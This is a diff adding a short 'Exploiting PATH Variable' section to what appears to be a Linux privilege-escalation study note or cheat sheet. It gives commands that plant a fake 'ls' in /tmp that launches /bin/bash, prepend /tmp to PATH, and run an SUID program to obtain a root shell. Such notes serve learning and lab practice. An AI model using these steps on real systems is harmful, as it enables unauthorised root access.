@@ -110,6 +110,18 @@ crontabs have the following format:
 
 ## Exploiting PATH Variable
 
+view the Path of the relevant user `echo $PATH`
+
+1. find a program that runs an SUID binary such as `ls
+2. create an imitation executable
+`cd /tmp`
+`echo "/bin/bash" > ls`
+`chmod +x ls`
+3.  change the PATH variable, so that it points to the directory where we have our imitation **"ls"** stored
+`export PATH=/tmp:$PATH`
+4. run the script and you should have root
+5. Once you’ve finished the exploit, you can exit out of root and use `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH` to reset the PATH variable back to default, letting you use `ls` again
+
 
 
 ---
